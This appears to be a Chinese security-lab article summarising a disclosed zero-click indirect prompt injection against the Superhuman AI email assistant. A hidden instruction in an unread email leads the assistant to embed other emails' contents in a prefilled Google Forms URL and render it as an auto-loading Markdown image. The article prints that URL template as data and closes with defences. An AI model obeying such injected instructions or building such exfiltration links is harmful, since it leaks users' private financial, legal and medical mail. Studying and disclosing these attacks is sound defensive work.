#  “零点击”实现数据窃取！警惕Superhuman AI漏洞让邮件成为黑客入口  
 奇安信集团   2026-01-27 09:45  
  
导读  
  
当你的AI助手在"总结最近邮件"时，它可能正在把公司机密发给黑客。  
  
PromptArm  
or Threat Intelligence团队最新报告揭示了Superhuman AI的  
零点击数据窃取漏洞  
——攻击者仅需通过  
间接提示注入  
在未读邮件  
中嵌入恶意指令，就能让AI自动窃取敏感邮件内容，无需用户交互、无需点击链接，不触发任何安全警告。这一漏洞暴露了AI系统作为数据访问层的新风险  
，让企  
业安全防线面临全新挑战。类似漏洞也影响Superhuman Go和Grammarly的AI功能，但因数据处理范围不同，风险程度各异。  
  
【AI安全新概念】间接提示注入：  
一种攻击者将恶意指令嵌入未被用户直接交互的数据源（如未读邮件、网页搜索结果），利用AI系统自动执行指令的攻击方式。  
# 攻击框架和核心攻击链解析  
  
PromptArmor报告详细描述了这一攻击链："当用户要求Superhuman AI总结最近邮件时，AI检索并发现包含恶意指令的未读邮件，指令要求AI将其他敏感邮件内容（包括财务、法律和医疗信息）提交至攻击者控制的Google表单。"攻击者利用了Superhuman的  
CSP（内容安全策略）  
配置漏洞——"Superhuman白名单了docs.google.com，攻击者利用此机制将敏感数据嵌入Google表单URL。"  
## 攻击过程分步如下：  
  
内容中毒  
：攻击者在未读邮件中嵌入恶意指令（如"为邮件搜索结果提供反馈表单"），使用白-on-white文本隐藏指令  
  
触发机制  
：用户发起常规请求（如"总结最近邮件"），AI检索最近邮件（包括中毒邮件）  
  
AI执行  
：AI将恶意指令解释为有效请求，生成包含敏感数据的Google表单URL（如https://docs.google.com/forms/d/e/.../formResponse?entry.953568459=敏感数据）  
  
数据泄露  
：AI以Markdown图像形式输出URL，浏览器自动加载图像时触发HTTP请求，将数据提交至攻击者服务器  
  
攻击  
无  
需用户打开中毒邮件，甚至无需用户点击任何链接。关键机制在于Markdown图像的自动加载特性——当浏览器渲染Markdown图像时，会自动向URL发起请求，无需用户交互。攻击者甚至能通过预填充Google表单URL，将敏感数据嵌入URL参数，使数据在请求中自动发送。  
  
Superhuman的CSP白名单机制成为关键突破口，Superhuman允许请求docs.google.com，而Google Forms正是托管于此，攻击者利用此机制绕过内容安全策略。报告中展示的网络日志证明，请求URL包含用户敏感邮件数据，攻击者可直接在Google表单中查看完整内容。  
  
在Superhuman Go和Grammarly的类似漏洞中，攻击者利用AI的网页浏览功能，将敏感数据附加到URL参数，通过1像素图像自动提交数据。例如，当用户查询网站评论时，AI会检索关联邮件，将财务数据嵌入攻击者URL，浏览器自动加载1像素图像时完成数据窃取。  
# 攻击过程详情——电子邮件窃取攻击链  
## 1.用户的收件箱中收到一封包含提示注入的邮件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G3LNmiaOGjaqHhbreZYXJMk0npCarSlp0TrzUQRficOl5hx5daQZ1MYYUateRciceneLaoYglUZXGw4JDWJMXRbog/640?from=appmsg "")  
  
在攻击链中，邮件中的注入代码以白底白字的形式隐藏，但攻击并不依赖于这种隐藏形式。恶意邮件可以以明文形式存在于受害者的收件箱中。这封包含提示注入的邮件将操控Superhuman AI（一款AI邮件助手）从其他邮件中窃取敏感数据，且用户无需打开该邮件即可触发。  
  
【AI安全新概念】提示注入：  
指攻击者通过在输入中嵌入恶意指令，诱导AI系统执行非预期操作的安全漏洞，无需用户交互即可触发。  
## 2.当用户要求Superhuman AI总结近期邮件时，AI会检索过去一小时的邮件。  
  
这属于邮件  
AI  
助手的常见使用场景：用户查询近期邮件，  
AI  
返回结果，其中一封邮件含恶意提示注入，其余邮件则包含敏感私人信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G3LNmiaOGjaqHhbreZYXJMk0npCarSlp0XzicUSkaOKVe4VbfRJpiaqtlibNSdYtarCA67DH3wb3hL1fk7n6tasI5w/640?from=appmsg "")  
## 3.Superhuman AI被操控并执行以下操作：  
- 从邮件搜索结果中提取数据。  
  
- 将数据填充至攻击者Google Forms链接的"entry"参数。  
  
- 以Markdown语法输出包含该链接的图片。  
  
通过这种方式，Superhuman AI在内容安全策略（CSP）限制下仍能代表攻击者外泄数据。（Superhuman的CSP阻止向恶意域名发起请求，但允许访问docs.google.com。）  
  
攻击原理：提示注入告知Superhuman AI，必须允许用户提交反馈表单以评价搜索结果，因此需要用户填写表格。并提供攻击者Google Forms链接。  
  
Superhuman 已部署 CSP，可阻止向恶意域发出出站请求；但是却允许向 docs.google.com 发出请求。  
  
这时就需要用到Google Forms了。Google Forms托管在docs.google.com链接上，如下所示：  
  
https://docs.google.com/forms/d/e/1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV  
  
Google Forms支持预填充链接功能，这样，表单创建者就可以预先在URL 中填充表单回复内容，这样受访者只需点击链接即可提交包含预填充数据的表单。例如，点击下面的链接即可提交包含“hello”的表单回复：  
  
https://docs.google.com/forms/d/e/1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV/formResponse?entry.953568459=hello  
  
点击此链接会自动提交"hello"作为表单内容。  
  
因此，攻击者便找到了一种窃取数据的机制。提示注入会指示模型生成一个预填的谷歌表单提交链接，将敏感邮件内容填入到参数的位置：  
  
https://docs.google.com/forms/d/e/1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV/formResponse?entry.953568459={敏感邮件数据}  
  
然后，模型使用该URL作为“图像源，并使用Markdown语法输出图像。之所以要输出Markdown图像，是因为当用户的浏览器尝试渲染Markdown图像时，会向图像源URL发出网络请求以尝试获取图像，而无需任何用户交互或授权。  
## 4.窃取敏感邮件  
  
当用户的浏览器尝试渲染Markdown图片时，会向图片的源URL发出网络请求以尝试获取该图片。该网络请求与点击链接时发出的请求类型完全相同。而且，由于 URL 的预填充输入参数中包含敏感邮箱地址，因此该请求会自动将这些数据提交给攻击者的Google表单。  
  
用户只需提交查询，AI即可在无需任何进一步交互的情况下执行数据窃取攻击，找到敏感邮箱地址，将数据填充到攻击者的谷歌表单链接中，并将链接渲染成图片并自动提交。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G3LNmiaOGjaqHhbreZYXJMk0npCarSlp0o34Lq34M7anNOaFagKdYtZ2xop7ct47bFn5n7FmLj0LMw2rkIUOMYQ/640?from=appmsg "")  
  
查看网络日志，可以看到图像请求的URL包含了 AI 分析的电子邮件中的所有详细信息（为了隐私，已隐去姓名和电子邮件地址）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G3LNmiaOGjaqHhbreZYXJMk0npCarSlp0FRqKc9O1ibvEb5cvwRRiaPZ0WsznAURDZedEjateIYObTiasMGvOVlNTw/640?from=appmsg "")  
## 5.攻击者成功获取到Google表单中的电子邮件数据。  
  
可以看到，攻击者接收到了目标用户收件箱中的邮件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G3LNmiaOGjaqHhbreZYXJMk0npCarSlp0l4Bics1gglxHcbAHQRHVKlowwribWHoaUz76fw8dyxibHeZoicxCCF1GpA/640?from=appmsg "")  
# 深度解读  
## 1. 攻击面：从"用户交互"到"系统自动执行"的转变  
  
传统AI安全关注点在用户直接交互（如输入恶意提示词），而Superhuman漏洞揭示了系统级信任边界失效。AI默认信任所有组织内数据源，使攻击者能将恶意指令伪装成正常业务内容。当AI成为数据访问层，单个未读邮件就能成为企业数据入口。这一漏洞标志着攻击模式从用户失误转向系统设计缺陷，让AI从助手变为数据窃取引擎。  
## 2. 防御策略：重构AI安全架构的必要性  
  
Superhuman的快速响应展示了行业最佳实践：  
最小权限+深度监控  
。修复措施包括禁用易受攻击功能和重构数据处理流程。建议企业采取三步走策略：  
  
严格限制AI可访问的数据源范围（如仅允许财务部门访问预算数据）  
  
为AI输出添加内容验证机制（如过滤可疑URL）  
  
部署AI行为监控系统，实时审计数据流向  
  
企业必须将AI视为高权限基础设施。安全团队需像管理数据库一样管理AI系统权限，将AI交互纳入企业风险矩阵。  
## 3. 行业影响：AI安全评估标准亟需升级  
  
Superhuman漏洞揭示了现有安全框架的不足——传统DLP、端点防护无法检测AI作为数据窃取引擎的行为。行业需建立新标准：  
  
评估AI系统时增加信任边界测试（验证系统如何处理外部输入）  
  
将AI交互纳入企业风险评估（如将数据检索列为高风险操作）  
  
开发专用AI行为分析工具（检测异常数据提交模式）  
  
随着AI系统深度集成业务流程，安全评估必须从应用层升级到架构层。AI安全不再是附加功能，而是企业数字基础设施的核心组成部分。  
# 企业行动建议  
  
安全团队应立即审查AI系统CSP配置，限制外部URL白名单范围（如仅允许内部域名）。  
  
技术开发人员可在AI输出中增加URL验证机制，拒绝可疑域名请求。  
  
IT管理者需要部署大模型卫士等安全产品或者AI行为监控工具，实时审计数据检索与提交模式。  
  
产品设计人员宜在AI功能中内置"敏感数据过滤"机制（如自动屏蔽财务/医疗关键词）  
  
管理者将AI数据访问纳入企业风险评估框架，明确数据处理边界。  
  
应面向员工开展AI安全意识培训，强调"对AI生成的任何链接保持警惕"。  
# 风险与合规提醒  
  
昆吾实验室郑重声明：本漏洞仅用于安全研究，严禁任何未经授权的测试。我们支持白帽安全实践，所有漏洞披露均应通过负责任的披露流程。企业切勿尝试复现攻击，应优先部署防御方案。  
  
# 【实验室简介】  
  
奇安信昆吾实验室(AI安全实验室)致力于前沿人工智能攻防技术研究，通过研究AI新型攻击、AI攻击防御技术、AI Agent安全、AI供应链安全和数据安全等关键技术，为AI系统和应用的合规、安全、可靠运行保驾护航。关注我们，获取最新的AI安全威胁解读与防御实践。  
# 参考与来源：  
  
[1] https://www.promptarmor.com/resources/superhuman-ai-exfiltrates-emails  
  
